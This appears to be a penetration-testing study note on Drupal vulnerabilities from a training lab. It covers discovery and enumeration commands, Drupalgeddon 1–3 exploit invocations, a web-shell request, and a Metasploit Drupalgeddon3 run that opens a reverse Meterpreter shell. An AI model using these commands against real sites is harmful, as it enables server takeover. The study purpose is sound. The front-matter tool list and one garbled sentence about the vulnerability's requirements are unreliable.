---
title: Drupal Security Vulnerabilities
aliases: []
tags:
- vulnerabilities/drupalgeddon
- vulnerabilities/drupalgeddon2
- vulnerabilities/drupalgeddon3
category: vulnerabilities
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: drupal.md
related_tools:
- '[[curl]]'
- '[[droopescan]]'
- '[[python2-7]]'
- '[[python3]]'
- '[[wget]]'
- '[[tar]]'
- '[[system]]'
- '[[msfconsole]]'
- '[[msfvenom]]'
- '[[nmap]]'
- '[[evil-winrm]]'
- '[[find]]'
- '[[masscan]]'
- '[[socat]]'
- '[[eyewitness]]'
- '[[aquatone]]'
- '[[joomlascan]]'
- '[[get-240token]]'
- '[[get-falconhost]]'
- '[[invoke-falconrtr]]'
- '[[searchsploit]]'
- '[[python2-7]]'
- '[[cmd-jsp]]'
- '[[crackmapexec]]'
- '[[locate]]'
- '[[mgr-brute-py]]'
- '[[psfalcon]]'
- '[[rtr]]'
- '[[splunk]]'
- '[[urllib3]]'
- '[[whoami]]'
related_techniques:
- '[[t1110]]'
- '[[t1190]]'
- '[[t1110]]'
- '[[t1190]]'
related_tactics:
- '[[T1089]]'
- '[[T1059]]'
- '[[t1190]]'
related_services:
- '[[http]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Drupal Security Vulnerabilities

## Description
Drupal is a content management system written in PHP and supports using MySQL, PostgreSQL, or SQLite for the backend. It uses nodes for content, which can be articles, polls, or blog posts. Drupal has three user types: Administrator, Authenticated, and Anonymous.

Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. Specifically, it impacts versions >=7.0 <7.59, >= 8.0.0 <8.4.8, and >=8.5.0 <8.5.3. This vulnerability allows a user to have the ability to delete a node.

## Discovery
- Check for references to Drupal using `curl -s http://drupal.inlanefreight.local | grep Drupal`
- Nodes can be accessed via `/node/<nodeid>`
- Drupal uses three user types: Administrator, Authenticated, and Anonymous.

## Enumeration
- Check version and installed plugins in `CHANGELOG.txt` and `README.txt` using `curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ''` and `curl -s http://drupal-acc.inlanefreight.local/README.txt | grep -m2 ''`
- Use `droopescan` for version enumeration: `droopescan scan drupal -u http://drupal.inlanefreight.local --enumerate v`

## Attack
- For versions before 8, enable the PHP filter module and add a Basic Page with PHP code to gain RCE. For versions 8 and above, use a modified module to create a web shell.
- Drupalgeddon: Exploit versions 7.0 to 7.31 with `python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd`
- Drupalgeddon2: Exploit versions 8.3.9 to 8.4.6 and 8.5.1 with `python3 drupalgeddon2.py` and `curl http://drupal-dev.inlanefreight.local/exploit.php?cmd=id`

## Exploits
- Drupalgeddon: Requires Python 2.7 and can be used to add an admin user and gain RCE.
- Drupalgeddon2: A remote code execution vulnerability in versions 8.3.9 to 8.4.6 and 8.5.1, which can be exploited by modifying the `drupalgeddon2.py` script and executing it.

## Metasploit
To exploit this vulnerability using Metasploit, the following steps are required:

1. After logging in, get the session cookie.
2. Use the `exploit/multi/http/drupal_drupageddon3` module.
3. Set the `rhosts`, `vhost`, `drupal_session`, `drupal_node`, and `lhost` options.
4. Run the exploit.

Example commands:
```sh
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options
```

After setting the options, run the exploit:
```sh
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```

Output:
```sh
[*] Started reverse TCP handler on 10.10.14.15:4444
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid
Server username: www-data (33)

meterpreter > sysinfo
Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

## References
- https://www.drupal.org/SA-CORE-2014-005
- https://www.exploit-db.com/exploits/34992
- https://www.drupal.org/sa-core-2018-002
- https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/
- https://www.drupal.org/sa-core-2018-004

